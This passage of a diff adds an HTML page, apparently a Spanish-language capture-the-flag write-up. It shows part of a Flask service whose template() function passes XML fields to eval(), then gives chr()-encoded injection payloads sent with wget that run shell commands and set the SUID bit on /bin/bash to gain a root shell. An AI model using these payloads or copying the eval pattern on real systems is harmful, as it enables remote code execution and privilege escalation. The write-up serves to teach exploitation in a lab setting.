+        <span style="color:#c678dd;">return</span> <span style="color:#98c379;">"No &lt;patient&gt; tag found\n"</span>, <span style="color:#d19a66;">400</span>
+
+    id = uuid.uuid4().hex
+    data = {tag: (patient.findtext(tag) <span style="color:#c678dd;">or</span> <span style="color:#98c379;">""</span>) <span style="color:#c678dd;">for</span> tag <span style="color:#c678dd;">in</span>
+            [<span style="color:#98c379;">"firstname"</span>, <span style="color:#98c379;">"lastname"</span>, <span style="color:#98c379;">"sender_app"</span>, <span style="color:#98c379;">"timestamp"</span>, <span style="color:#98c379;">"birth_date"</span>, <span style="color:#98c379;">"gender"</span>]}
+
+    notification = template(
+        data[<span style="color:#98c379;">"firstname"</span>], data[<span style="color:#98c379;">"lastname"</span>], data[<span style="color:#98c379;">"sender_app"</span>],
+        data[<span style="color:#98c379;">"timestamp"</span>], data[<span style="color:#98c379;">"birth_date"</span>], data[<span style="color:#98c379;">"gender"</span>]
+    )
+
+    path = os.path.join(USER_DIR, <span style="color:#98c379;">f"{id}.txt"</span>)
+    <span style="color:#c678dd;">with</span> <span style="color:#61afef;">open</span>(path, <span style="color:#98c379;">"w"</span>) <span style="color:#c678dd;">as</span> f:
+        f.write(notification + <span style="color:#98c379;">"\n"</span>)
+    <span style="color:#c678dd;">return</span> notification
+
+<span style="color:#c678dd;">if</span> __name__ == <span style="color:#98c379;">"__main__"</span>:
+    app.run(<span style="color:#98c379;">"127.0.0.1"</span>, <span style="color:#d19a66;">54321</span>, threaded=<span style="color:#d19a66;">True</span>)</code></pre>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>La vulnerabilidad es sutil pero crítica. La función <code>template()</code> aplica una comprobación
+                    de lista blanca con regex sobre cada valor de campo, luego construye una f-string de Python y la
+                    pasa a <code>eval()</code>. El regex permite los caracteres <code>{ }</code> y <code>( )</code>,
+                    que son exactamente los necesarios para inyectar expresiones Python dentro de un contexto de
+                    f-string. Cualquier valor que contenga <code>{alguna_expresion}</code> será evaluado como código
+                    Python por <code>eval()</code> al construirse la cadena del template.</p>
+
+                <p>El problema es que caracteres como espacios, puntos y coma o corchetes angulares están bloqueados
+                    por el regex. Para evadirlo, codifico el comando shell carácter por carácter usando la función
+                    <code>chr()</code> de Python — que está formada únicamente por caracteres alfanuméricos y
+                    paréntesis, todos permitidos por el regex — y los concateno con <code>+</code>, también en la
+                    lista blanca.</p>
+
+                <p>Cabe destacar que <code>curl</code> no está disponible en esta máquina, así que uso
+                    <code>wget</code> para hacer las peticiones POST.</p>
+
+                <h3>Prueba de Concepto — Confirmando RCE</h3>
+                <p>Primero pruebo con un simple <code>touch /tmp/xd</code> para confirmar la ejecución. La secuencia
+                    de chr() codifica <code>touch /tmp/xd</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">wget</span> -q -O- \
+  <span style="color:#d19a66;">--post-data</span>=<span style="color:#98c379;">'&lt;patient&gt;
+&lt;firstname&gt;{__import__("os").popen(chr(116)+chr(111)+chr(117)+chr(99)+chr(104)+chr(32)+chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(120)+chr(100)).read()}&lt;/firstname&gt;
+&lt;lastname&gt;A&lt;/lastname&gt;
+&lt;sender_app&gt;B&lt;/sender_app&gt;
+&lt;timestamp&gt;C&lt;/timestamp&gt;
+&lt;birth_date&gt;01/01/1990&lt;/birth_date&gt;
+&lt;gender&gt;M&lt;/gender&gt;
+&lt;/patient&gt;'</span> \
+  <span style="color:#d19a66;">--header</span>=<span style="color:#98c379;">'Content-Type: application/xml'</span> \
+  http://127.0.0.1:54321/addPatient</code></pre>
+
+                <p>Comprobando el resultado confirmo que el archivo fue creado por root:</p>
+
+                <pre><code class="language-plaintext">-rw-r--r-- 1 root root 0 Feb 21 17:19 xd</code></pre>
+
+                <h3>Escalando a Root — SUID en /bin/bash</h3>
+                <p>Ahora construyo el payload real de escalada de privilegios. La secuencia de chr() codifica
+                    <code>chmod u+s /bin/bash</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">wget</span> -q -O- \
+  <span style="color:#d19a66;">--post-data</span>=<span style="color:#98c379;">'&lt;patient&gt;
+&lt;firstname&gt;{__import__("os").popen(chr(99)+chr(104)+chr(109)+chr(111)+chr(100)+chr(32)+chr(117)+chr(43)+chr(115)+chr(32)+chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104)).read()}&lt;/firstname&gt;
+&lt;lastname&gt;A&lt;/lastname&gt;
+&lt;sender_app&gt;B&lt;/sender_app&gt;
+&lt;timestamp&gt;C&lt;/timestamp&gt;
+&lt;birth_date&gt;01/01/1990&lt;/birth_date&gt;
+&lt;gender&gt;M&lt;/gender&gt;
+&lt;/patient&gt;'</span> \
+  <span style="color:#d19a66;">--header</span>=<span style="color:#98c379;">'Content-Type: application/xml'</span> \
+  http://127.0.0.1:54321/addPatient</code></pre>
+
+                <p>Tras completarse la petición, verifico que el bit SUID está puesto en <code>/bin/bash</code> y
+                    escalo:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ls</span> -lah /bin/bash</code></pre>
+
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1.3M Sep  6 18:07 /bin/bash</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">bash</span> -p</code></pre>
+
+                <pre><code class="language-plaintext">bash-5.2# whoami
+root</code></pre>
+
+                <p>Shell de root obtenida. La flag de root está ahora accesible.</p>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
